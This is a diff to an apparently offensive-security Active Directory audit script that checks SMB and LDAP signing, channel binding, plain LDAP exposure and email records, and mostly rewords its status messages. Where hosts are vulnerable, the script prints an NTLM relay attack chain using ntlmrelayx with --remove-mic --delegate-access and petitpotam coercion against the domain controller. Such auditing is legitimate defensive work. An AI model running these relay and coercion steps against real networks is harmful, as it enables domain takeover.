@@ -712,11 +712,11 @@ else
   fi
 fi
 
-# NTLMv2 - SMB Signing
+# SMB Signing
 if [ "$RELAY_COUNT" -gt 0 ]; then
-  echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without NTLMv2 SMB Signing → relay_targets.txt${NC}"
+  echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without SMB Signing → relay_targets.txt${NC}"
 else
-  echo -e "${GREEN}[OK] NTLMv2 SMB Signing enabled on all non-DC host(s)${NC}"
+  echo -e "${GREEN}[OK] SMB Signing enabled on all non-DC host(s)${NC}"
   rm -f "$OUTPUT_DIR/relay_targets.txt"
 fi
 
@@ -741,9 +741,9 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   done < "$OUTPUT_DIR/all_dcs.txt"
   if [ $VULN_COUNT -gt 0 ]; then
     if [ $VULN_COUNT -eq $DC_COUNT ]; then
-      echo -e "${RED}[KO] All $DC_COUNT DCs: NTLMv2 LDAP Signing + LDAPS Channel Binding NOT enforced → ldap_security_check.csv${NC}"
+      echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + LDAPS Channel Binding NOT enforced → ldap_security_check.csv${NC}"
     else
-      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without NTLMv2 LDAP Signing + LDAPS Channel Binding → ldap_security_check.csv${NC}"
+      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + LDAPS Channel Binding → ldap_security_check.csv${NC}"
       printf "$VULN_DCS"
     fi
     FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
@@ -755,14 +755,14 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
     fi
   else
-    echo -e "${GREEN}[OK] NTLMv2 LDAP Signing + LDAPS Channel Binding on all DCs enforced${NC}"
+    echo -e "${GREEN}[OK] LDAP Signing + LDAPS Channel Binding on all DCs enforced${NC}"
   fi
 else
   LDAP_CHECK=$(netexec ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
   LDAP_SIGNING=$(echo "$LDAP_CHECK" | grep -oP 'signing:\K\w+')
   LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
   if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
-    echo -e "${RED}[KO] NTLMv2 LDAP Signing + LDAPS Channel Binding NOT enforced${NC}"
+    echo -e "${RED}[KO] LDAP Signing + LDAPS Channel Binding NOT enforced${NC}"
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
       echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
@@ -771,13 +771,13 @@ else
       echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
     fi
   elif [ "$LDAP_SIGNING" = "None" ]; then
-    echo -e "${RED}[KO] NTLMv2 LDAP Signing NOT enforced${NC}"
+    echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: LDAPS Channel Binding enabled${NC}"
   elif [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
-    echo -e "${RED}[KO] NTLMv2 LDAP Channel Binding NOT enforced${NC}"
+    echo -e "${RED}[KO] LDAP Channel Binding NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
   else
-    echo -e "${GREEN}[OK] NTLMv2 LDAP Signing + LDAPS Channel Binding enforced${NC}"
+    echo -e "${GREEN}[OK] LDAP Signing + LDAPS Channel Binding enforced${NC}"
   fi
 fi
 
@@ -798,9 +798,9 @@ fi
 # Plain LDAP without TLS enforcement
 PLAIN_LDAP=$(ldapsearch -x -H ldap://$DC_IP -b "" -s base supportedCapabilities 2>/dev/null | grep -c "dn:")
 if [ "$PLAIN_LDAP" -gt 0 ]; then
-  echo -e "${RED}[KO] Plain LDAP (port 389) is accessible, intercepted responder traffic may be unencrypted${NC}"
+  echo -e "${RED}[KO] LDAP port 389 is accessible, intercepted traffic may be unencrypted${NC}"
 else
-  echo -e "${GREEN}[OK] Plain LDAP not accessible without TLS${NC}"
+  echo -e "${GREEN}[OK] LDAP not accessible without TLS${NC}"
 fi
 
 
@@ -910,7 +910,7 @@ if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/n
   $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
   
   # Fallback with DNS TCP if no JSONs produced
-  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | wc -l)
+  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | grep -v Certipy | wc -l)
   if [ "$BH_JSON" -eq 0 ]; then
     $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE --dns-timeout 30 --dns-tcp &>/dev/null
   fi
@@ -1539,7 +1539,7 @@ fi
 
 # Email Security SPF/DMARC, Open Relay
 if [[ "$DOMAIN" == *.local || "$DOMAIN" == *.htb ]]; then
-  echo -e "${GREY}[--] SPF and DMARC skipped (.local domain is internal only)${NC}"
+  echo -e "${GREY}[--] SPF, DMARC and open relay skipped (.local domain is internal only)${NC}"
 else
   SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
   DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
